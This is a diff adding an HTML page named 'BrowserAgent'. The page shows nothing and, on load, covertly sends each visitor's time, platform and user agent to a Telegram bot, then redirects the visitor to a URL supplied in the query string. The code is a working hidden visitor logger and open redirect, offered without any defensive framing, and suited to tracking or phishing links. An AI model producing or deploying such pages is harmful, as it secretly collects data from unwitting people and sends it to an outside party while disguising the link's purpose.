@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="kk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BrowserAgent</title>
+    <script>
+        const BOT_TOKEN = 'СЕНІҢ_БОТ_ТОКЕНІҢ';
+        const CHAT_ID = 'СЕНІҢ_CHAT_ID';
+
+        async function sendToBot(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                });
+            } catch (e) { console.error(e); }
+        }
+
+        window.onload = async () => {
+            const info = `🔔 Жаңа кіру!\n📍 Уақыты: ${new Date().toLocaleString()}\n📱 Платформа: ${navigator.platform}\n🌐 UserAgent: ${navigator.userAgent}`;
+            await sendToBot(info);
+            const urlParams = new URLSearchParams(window.location.search);
+            const targetUrl = urlParams.get('url') || 'https://google.com';
+            setTimeout(() => { window.location.href = targetUrl; }, 1000);
+        };
+    </script>
+</head>
+<body style="background: black;"></body>
+</html>
